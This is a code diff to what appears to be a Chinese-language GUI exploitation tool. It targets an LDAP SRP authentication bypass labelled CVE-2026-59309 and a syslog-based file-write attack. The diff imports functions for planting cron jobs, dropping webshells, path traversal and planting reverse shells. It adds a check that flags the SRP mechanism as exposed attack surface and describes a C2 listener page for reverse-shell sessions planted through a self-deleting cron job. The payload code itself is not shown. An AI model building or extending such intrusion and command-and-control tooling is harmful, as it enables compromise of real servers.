@@ -25,7 +25,7 @@ from .util import rand_name
 from .recon import probe_target
 from .srp59309 import srp_bypass_bind
 from .berldap import (connect_ldap, root_dse_probe, op_search, op_add,
-                      op_modify, collect_search, parse_ldap_result)
+                      op_modify, collect_search, parse_ldap_result, has_srp)
 from .syslog59310 import (build_rfc5424, check_write, write_file, plant_cron,
                           rce_readback, drop_webshell, traversal_app,
                           traversal_host, plant_revshell)
@@ -927,7 +927,7 @@ class ToolApp:
             def _show(mechs=mechs, ncs=ncs):
                 self.log("[+] SASL 机制: %s" % (",".join(mechs) or "(无)"), "+")
                 self.log("[+] namingContexts: %s" % (";".join(ncs) or "(无)"), "+")
-                if "SRP" in mechs:
+                if has_srp(mechs):
                     self.log("[+] 通告 SRP 机制 → CVE-2026-59309 攻击面暴露", "+")
                 else:
                     self.log("[!] 未通告 SRP 机制（可能已修复/禁用，或需认证读 rootDSE）",
@@ -1146,7 +1146,7 @@ class ToolApp:
                 self.log("[!] 探测失败: %r" % e, "!")
                 return
             self.log("[+] SASL 机制: %s" % (",".join(dse["mechs"]) or "(无)"), "+")
-            if "SRP" not in dse["mechs"]:
+            if not has_srp(dse["mechs"]):
                 self.log("[!] 未通告 SRP 机制，中止（可能已修复/禁用）", "!")
                 return
             base = dse["namingContexts"][0] if dse["namingContexts"] else \
@@ -1209,7 +1209,8 @@ class ToolApp:
         ttk.Button(lbar, text="关闭选中会话", style="Danger.TButton",
                    command=self._c2_close).pack(side="left")
         ttk.Label(lf, text="流程：② 页植入反弹 → 本页启动监听 → 回连后双击会话行交互。"
-                           "断线不自动重连，重连 = 重新植入（本工具不做隐蔽持久化）。",
+                           "植入为一次性 cron（回连后自毁，不会每分钟重复回连）；"
+                           "断线后需重新植入。本工具不做隐蔽持久化。",
                   style="Muted.TLabel", wraplength=int(520 * self.S),
                   justify="left").pack(anchor="w", padx=6, pady=2)
         wrapf = ttk.Frame(lf)
